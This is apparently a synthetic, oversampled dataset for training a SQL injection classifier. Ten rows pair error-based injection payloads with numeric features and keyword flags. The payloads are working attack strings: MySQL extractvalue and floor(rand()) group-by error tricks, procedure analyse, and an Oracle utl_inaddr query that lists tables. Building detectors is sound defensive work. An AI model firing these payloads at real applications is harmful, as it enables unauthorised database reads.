id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000001,attack,error,"1""  )   as zbhs where 2017  =  2017 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",nearest_attack_euclidean,R000042,1.1985611214237146,326.2968124454052,40.0,4.031871896504325,109.2968124454052,63.0,119.0,35.0,0.33496002233216005,0.19307612254872772,0.3646993425920413,0.10726451252707096,0.29681244540518903,0.703187554594811,2.0,0.0,2.0,2.0,0.0,21.0,0.0,0.0,6.0,7.0,0.2968124454051891,0.703187554594811,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,1.0,1.0,0.2968124454051889,0.703187554594811,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000002,attack,error,"1'+  (  select bruk where 1400  =  1400 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1   )    )   +'",nearest_attack_euclidean,R000039,0.9766166944771764,229.64416702236488,32.68886907302606,3.920056643900716,81.0,42.51095258420851,81.44434536513032,24.688869073026062,0.35300742951026504,0.1848013867268526,0.35465250490645317,0.10753867885642922,2.6222618539478724,0.0,0.0,0.0,0.0,1.6888690730260638,0.0,14.0,0.0,0.0,5.0,3.0666072190781914,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.6888690730260638,0.0,0.6888690730260637,0.0,0.3111309269739362,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.688869073026064
SMOTE_000003,attack,error,"1'+  (  select bruk where 1400  =  1400 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1   )    )   +'",nearest_attack_euclidean,R000039,0.4298205698979156,235.1003198770846,32.75548447175898,3.8920837063910922,80.51096894351797,44.02193788703593,85.07838199004865,25.489031056482034,0.3425739654380668,0.18741196354503187,0.36164775836012386,0.10836631265677749,2.2445155282410174,0.0,0.0,0.0,0.0,2.0,0.0,14.489031056482034,0.0,0.0,5.0,3.755484471758982,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.8777422358794913,0.0,0.8777422358794911,0.0,0.1222577641205086,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.8777422358794915
SMOTE_000004,attack,error,"1 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  # vojr",nearest_attack_euclidean,R000059,1.3992877839404942,301.34472722536964,38.68560428086061,4.013736411074669,105.45835291053328,55.0,108.94318715741817,31.94318715741817,0.3497594150389663,0.18263794148394644,0.36164788077730614,0.1059547626997811,1.257582876557559,0.0,0.0,0.0,2.0,0.9999999999999999,0.0,20.0,0.0,0.0,6.0,4.0,0.3143957191393898,0.0,0.0,0.6856042808606102,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,0.3143957191393897,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,13.31439571913939
SMOTE_000005,attack,error,"1'||  (  select 'xuou' from dual where 7681  =  7681 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )     )  ||'",nearest_attack_euclidean,R000033,0.11523693603624702,196.51531090783197,31.939413863478997,3.930303573785883,58.33355249826896,43.24234454608401,67.878827726958,27.060586136521003,0.2967342545214433,0.22011612028420424,0.3454217473874829,0.13772787780686957,4.0,0.0,0.0,0.0,0.0,2.0,0.0,12.0,0.0,0.0,5.060586136521004,6.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,0.0,1.0,0.9394138634789961,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.939413863478997
SMOTE_000006,attack,error,"1""   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   ""gcyp"" like ""gcyp",nearest_attack_euclidean,R000043,1.1661726976898443,199.25403704654022,32.0,3.6236567999610623,54.26288437379955,34.03019241122876,84.69807588771236,26.26288437379955,0.27321506719498423,0.17291280592723327,0.4224051285259813,0.13146699835180123,0.0,4.0,0.0,0.0,0.32326919625707856,0.9999999999999999,0.0,15.939615177542471,0.0,0.0,4.676730803742921,1.323269196257078,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.6465383925141572,0.0,0.0,0.3232691962570786,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.969807588771236
SMOTE_000007,attack,error,"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'kdxg' like 'kdxg",nearest_attack_euclidean,R000025,0.7022042152081103,318.04374996335207,38.210156248473005,4.0350920017683745,112.36953125458099,55.0,115.62343746640606,35.05078124236501,0.35374825358903567,0.1730889330971041,0.3630443367151716,0.11011847659868866,4.0,0.0,0.0,0.0,2.0,1.2101562484730026,0.0,20.84062499389201,0.0,0.0,6.0,4.210156248473003,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,1.2101562484730026,0.7898437515269974,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000008,attack,error,"1""   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   ""jzbb""  =  ""jzbb",nearest_attack_euclidean,R000050,1.3744639915362122,229.16082230316584,32.451546043309406,3.819637838839079,77.0,37.0,88.70927625985644,26.451546043309406,0.33626544148502224,0.16158209525903666,0.3867455605200245,0.11540690273591654,1.0969079133811859,2.903092086618814,0.0,0.0,0.0,2.0,0.0,15.451546043309406,0.0,0.0,5.0,2.0,0.27422697834529647,0.7257730216547034,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000009,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000001,1.5595657225989588,235.56498834213542,42.20146227728151,4.343458121292597,134.06133264893165,2.0,74.30219341592226,25.201462277281504,0.567667742748745,0.008555506696900833,0.3167212492199887,0.10705550133436557,3.0,0.0,0.0,0.0,0.0,3.550365569320376,0.0,10.0,0.0,5.651096707961128,1.0,3.550365569320376,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.5503655693203762,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.550365569320376
SMOTE_000010,attack,error,"1""  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and   (  ""hybu"" like ""hybu",nearest_attack_euclidean,R000035,1.702926465788556,331.23135621697685,39.68559320795753,3.9801986975391164,112.74237283183011,55.0,125.91694942493437,37.57203396021236,0.34089509898581843,0.16621549265366523,0.37956345593498503,0.11332595242553134,1.257627168169887,2.7423728318301124,0.0,0.0,2.0,1.3144067920424716,0.0,23.257627168169886,0.0,0.0,6.0,4.314406792042472,0.3144067920424718,0.6855932079575282,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
